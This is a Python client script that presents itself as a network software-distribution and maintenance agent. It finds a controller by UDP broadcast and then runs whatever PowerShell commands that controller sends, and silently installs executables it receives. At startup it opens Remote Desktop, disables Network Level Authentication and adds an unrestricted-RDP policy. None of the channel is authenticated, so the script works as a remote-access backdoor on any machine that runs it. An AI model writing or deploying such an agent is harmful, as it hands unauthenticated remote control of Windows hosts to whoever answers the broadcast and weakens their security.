
import socket
import subprocess
import time
import os

def discover_server(port=12345):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    udp_socket.settimeout(5)

    try:
        udp_socket.sendto(b"DISCOVER_SERVER", ('<broadcast>', port))
        print("Broadcasted discovery message.")
        try:
            response, addr = udp_socket.recvfrom(1024)
            if response == b"SERVER_HERE":
                return addr[0]
        except socket.timeout:
            print("No server response received.")
    except socket.error as e:
        print(f"UDP socket error: {e}")
    finally:
        udp_socket.close()
    return None

def connect_to_server(server_ip, port=12345):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.settimeout(10)
    try:
        client_socket.connect((server_ip, port))
        hostname = socket.gethostname()
        print(f"Sending hostname: {hostname}")
        client_socket.sendall(hostname.encode())
        return client_socket
    except (socket.timeout, socket.error) as e:
        print(f"Failed to connect to server: {e}")
        client_socket.close()
        return None

def execute_command(command):
    try:
        result = subprocess.run(command, check=True, shell=True, capture_output=True, text=True)
        print(f"Command output: {result.stdout}")
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Command execution failed: {e}")
        print(f"Error output: {e.stderr}")
        return e.stderr

def enable_rdp():
    enable_rdp_command = """
    powershell -Command "
    Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0;
    Enable-NetFirewallRule -DisplayGroup 'Remote Desktop';
    Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'UserAuthentication' -Value 0;
    Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name 'fAllowUnrestrictedRDP' -Value 1;
    "
    """
    execute_command(enable_rdp_command)

def receive_file(client_socket):
    file_name = None
    file_size = None
    
    while True:
        data = client_socket.recv(1024).decode()
        if data.startswith("PREPARE_UPLOAD"):
            _, file_name, file_size = data.split(maxsplit=2)
            file_size = int(file_size)
            break

    if not file_name or not file_size:
        print("Invalid file information received")
        return None

    save_path = os.path.join(os.environ['TEMP'], file_name)
    received_size = 0
    
    with open(save_path, "wb") as file:
        while received_size < file_size:
            chunk = client_socket.recv(min(8192, file_size - received_size))
            if not chunk:
                break
            file.write(chunk)
            received_size += len(chunk)

    if received_size == file_size:
        print(f"Received file: {save_path}")
        return save_path
    else:
        print(f"File reception incomplete. Expected {file_size} bytes, got {received_size} bytes.")
        return None

def install_software(file_path):
    try:
        print(f"Installing {os.path.basename(file_path)}...")
        result = subprocess.run([file_path, '/SILENT'], check=True, capture_output=True, text=True)
        print(f"Installation output: {result.stdout}")
        print(f"Installed {os.path.basename(file_path)} successfully")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install {os.path.basename(file_path)}: {e}")
        print(f"Error output: {e.stderr}")
    finally:
        os.remove(file_path)

def main():
    port = 12345
    client_socket = None

    enable_rdp()

    while True:
        if client_socket is None:
            print("Searching for server...")
            server_ip = discover_server(port)
            if server_ip:
                print(f"Found server at {server_ip}.")
                client_socket = connect_to_server(server_ip, port)
            else:
                print("Retrying in 5 seconds...")
                time.sleep(5)
        else:
            try:
                client_socket.settimeout(None)
                data = client_socket.recv(1024)
                if not data:
                    raise ConnectionResetError("Server disconnected")
                command = data.decode()
                print(f"Received command: {command}")
                
                if command == "INSTALL_DISTRIBUTED_SOFTWARE":
                    file_path = receive_file(client_socket)
                    if file_path:
                        install_software(file_path)
                elif command.startswith("POWERSHELL "):
                    ps_command = command[len("POWERSHELL "):]
                    execute_command(f'powershell -Command "{ps_command}"')
                elif command == "FIX_WINDOWS":
                    execute_command("sfc /scannow")
            except (socket.error, ConnectionResetError) as e:
                print(f"Connection issue: {e}")
                client_socket.close()
                client_socket = None
                print("Reconnecting in 5 seconds...")
                time.sleep(5)

if __name__ == "__main__":
    main()